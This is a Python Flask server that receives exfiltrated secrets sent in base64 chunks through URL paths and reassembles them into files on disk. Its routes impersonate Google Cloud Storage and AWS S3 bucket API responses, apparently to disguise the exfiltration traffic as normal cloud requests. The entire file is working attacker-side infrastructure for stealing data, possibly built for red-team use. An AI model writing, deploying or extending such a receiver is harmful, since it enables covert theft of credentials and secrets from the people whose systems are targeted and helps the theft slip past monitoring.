import sys, os

from flask import Flask
from base64 import b64decode
from pathlib import Path


app = Flask(__name__)
store = dict()
secrets_dir = "secrets"


def decode_chunk(method, info):
    (cid, ctotal, cidx, chunk) = info.split("-", 4)

    cid = int(cid)
    ctotal = int(ctotal)
    cidx = int(cidx)
    chunk = b64decode(chunk)

    # add current chunk
    key = f"{method}-{cid}"
    chunk_dict = store.setdefault(key, {})
    chunk_dict[cidx] = chunk
    if len(chunk_dict) >= ctotal:
        # make secrets dir
        path = Path(secrets_dir).joinpath(method)
        path.mkdir(parents=True, exist_ok=True)

        # write secret to file
        fpath = path.joinpath(f"{cid}.txt")
        with open(fpath, "wb") as out:
            for i in range(ctotal):
                out.write(chunk_dict[i])
        del store[key]
        return cid, True

    return cid, False


# http provider
@app.get("/http/<info>")
def http_get(info):
    cid, complete = decode_chunk("http", info)
    if complete:
        print(f"processed secret http exfil: {cid}")
    return "ohhi"


# gcp bucket api impersonator
@app.get("/b/<info>")
def gcp_get(info):
    cid, complete = decode_chunk("gcp-api", info)
    if complete:
        print(f"processed secret gcp bucket exfil: {cid}")
    # the selflink actually doesn't matter
    return f"""
{{
    "kind": "storage#bucket",
    "selfLink": "https://localhost/b/{info}",
    "id": "{info}",
    "name": "{info}",
    "projectNumber": "0",
    "metageneration": "1",
    "location": "ASIA-NORTHEAST1",
    "storageClass": "STANDARD",
    "etag": "CAE=",
    "defaultEventBasedHold": false,
    "timeCreated": "2022-01-01T00:00:00.001Z",
    "updated": "2022-01-01T00:00:00.001Z",
    "iamConfiguration": {{
        "bucketPolicyOnly": {{
            "enabled": true,
            "lockedTime": "2022-01-01T00:00:00.001Z"
        }},
        "uniformBucketLevelAccess": {{
            "enabled": true,
            "lockedTime": "2022-01-01T00:00:00.001Z"
        }},
        "publicAccessPrevention": "inherited"
    }},
    "locationType": "region",
    "satisfiesPZS": false
}}
"""


# aws s3 bucket api impersonator
@app.get("/<info>")
def aws_get(info):
    cid, complete = decode_chunk("aws-api", info)
    if complete:
        print(f"processed secret aws bucket exfil: {cid}")
    return f"""
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
    <Name>
        {info}
    </Name>
    <Prefix></Prefix>
    <Marker></Marker>
    <MaxKeys>1000</MaxKeys>
    <IsTruncated>false</IsTruncated>
    <Contents>
        <Key>example.txt</Key>
        <LastModified>2017-06-30T13:36:23.000Z</LastModified>
        <ETag>&quot;7e798b169cb3947a147b61fba5fa0f04&quot;</ETag>
        <Size>2477</Size>
        <StorageClass>STANDARD</StorageClass>
    </Contents>
</ListBucketResult>
    """


if __name__ == "__main__":
    if len(sys.argv) > 1:
        secrets_dir = sys.argv[1]
    port = os.getenv("SECRETS_RECEIVER_PORT", default="80")
    bind = os.getenv("SECRETS_RECEIVER_HOST", default="127.0.0.1")
    app.run(host=bind, port=int(port, 10))
